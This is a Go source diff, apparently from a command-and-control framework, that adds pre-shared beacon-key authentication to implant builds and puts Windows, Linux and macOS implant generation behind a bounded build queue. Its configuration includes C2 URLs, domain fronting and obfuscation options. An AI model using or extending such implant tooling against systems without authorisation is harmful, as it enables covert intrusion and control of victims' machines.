@@ -35,6 +35,7 @@ type binaryGenForm struct {
 	DNSDoTAddr      string `form:"dns_dot_addr"`
 	Proxy           string `form:"proxy"`
 	CryptoKey       string `form:"crypto_key"`
+	BeaconKey       string `form:"beacon_key"` // pre-shared key; empty = server's configured beacon_key
 	Architecture    string `form:"architecture"`
 	DomainFront     string `form:"domain_front"`
 	Obfuscate       string `form:"obfuscate"`
@@ -130,6 +131,11 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) payload.ImplantConfig {
 		hostKey = s.loadSSHHostPublicKeyB64()
 	}
 
+	beaconKey := form.BeaconKey
+	if beaconKey == "" && s != nil {
+		beaconKey = s.serverBeaconKey()
+	}
+
 	return payload.ImplantConfig{
 		C2URL:           form.C2URL,
 		Protocol:        form.Protocol,
@@ -152,6 +158,7 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) payload.ImplantConfig {
 		DNSDoTAddr:      form.DNSDoTAddr,
 		Proxy:           form.Proxy,
 		CryptoKey:       form.CryptoKey,
+		BeaconKey:       beaconKey,
 		Architecture:    arch,
 		DomainFront:     form.DomainFront,
 		Obfuscate:       form.Obfuscate == "true" || form.Obfuscate == "1",
@@ -165,6 +172,22 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) payload.ImplantConfig {
 		SSHHostKey:      hostKey,
 		PinnedCertSHA256: form.PinnedCertSHA256,
 	}
+}
+
+// serverBeaconKey returns the configured server beacon_key (empty = PSK auth disabled).
+func (s *Server) serverBeaconKey() string {
+	if s == nil || s.cfg == nil {
+		return ""
+	}
+	s.configMu.RLock()
+	defer s.configMu.RUnlock()
+	return s.cfg.Server.BeaconKey
+}
+
+// handleGetBeaconKey returns the server's configured beacon_key so the Generate
+// page can pre-fill the PSK field (operator-only, session-authenticated).
+func (s *Server) handleGetBeaconKey(c *gin.Context) {
+	c.JSON(http.StatusOK, gin.H{"beacon_key": s.serverBeaconKey()})
 }
 
 // loadSSHHostPublicKeyB64 returns base64 of the SSH transport host public key for implant pinning.
@@ -200,9 +223,13 @@ func (s *Server) handleGenerateEXE(c *gin.Context) {
 	agentsDir := s.extractAgentsDir()
 	job := s.startBuildJob("windows", "exe", form.C2URL, form.ListenerID, form.Filename)
 
-	go s.runBuildAndUpdateJob(job, func() (string, error) {
+	if !s.submitBuild(job, func() (string, error) {
 		return payload.GenerateWindowsEXE(cfg, agentsDir)
-	}, "windows", "exe", form.C2URL, form.ListenerID, form.Filename)
+	}, "windows", "exe", form.C2URL, form.ListenerID, form.Filename) {
+		s.abandonBuildJob(job)
+		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
+		return
+	}
 
 	c.JSON(http.StatusOK, gin.H{"success": true, "build_id": job.ID, "status": "building"})
 }
@@ -219,9 +246,13 @@ func (s *Server) handleGenerateDLL(c *gin.Context) {
 	agentsDir := s.extractAgentsDir()
 	job := s.startBuildJob("windows", "dll", form.C2URL, form.ListenerID, form.Filename)
 
-	go s.runBuildAndUpdateJob(job, func() (string, error) {
+	if !s.submitBuild(job, func() (string, error) {
 		return payload.GenerateWindowsDLL(cfg, agentsDir)
-	}, "windows", "dll", form.C2URL, form.ListenerID, form.Filename)
+	}, "windows", "dll", form.C2URL, form.ListenerID, form.Filename) {
+		s.abandonBuildJob(job)
+		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
+		return
+	}
 
 	c.JSON(http.StatusOK, gin.H{"success": true, "build_id": job.ID, "status": "building"})
 }
@@ -238,9 +269,13 @@ func (s *Server) handleGenerateLinux(c *gin.Context) {
 	agentsDir := s.extractAgentsDir()
 	job := s.startBuildJob("linux", "elf", form.C2URL, form.ListenerID, form.Filename)
 
-	go s.runBuildAndUpdateJob(job, func() (string, error) {
+	if !s.submitBuild(job, func() (string, error) {
 		return payload.GenerateLinuxELF(cfg, agentsDir)
-	}, "linux", "elf", form.C2URL, form.ListenerID, form.Filename)
+	}, "linux", "elf", form.C2URL, form.ListenerID, form.Filename) {
+		s.abandonBuildJob(job)
+		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
+		return
+	}
 
 	c.JSON(http.StatusOK, gin.H{"success": true, "build_id": job.ID, "status": "building"})
 }
@@ -257,9 +292,13 @@ func (s *Server) handleGenerateMacOS(c *gin.Context) {
 	agentsDir := s.extractAgentsDir()
 	job := s.startBuildJob("macos", "binary", form.C2URL, form.ListenerID, form.Filename)
 
-	go s.runBuildAndUpdateJob(job, func() (string, error) {
+	if !s.submitBuild(job, func() (string, error) {
 		return payload.GenerateMacOS(cfg, agentsDir)
-	}, "macos", "binary", form.C2URL, form.ListenerID, form.Filename)
+	}, "macos", "binary", form.C2URL, form.ListenerID, form.Filename) {
+		s.abandonBuildJob(job)
+		c.JSON(http.StatusTooManyRequests, gin.H{"success": false, "error": "build queue is full, retry shortly"})
+		return
+	}
 
 	c.JSON(http.StatusOK, gin.H{"success": true, "build_id": job.ID, "status": "building"})
 }
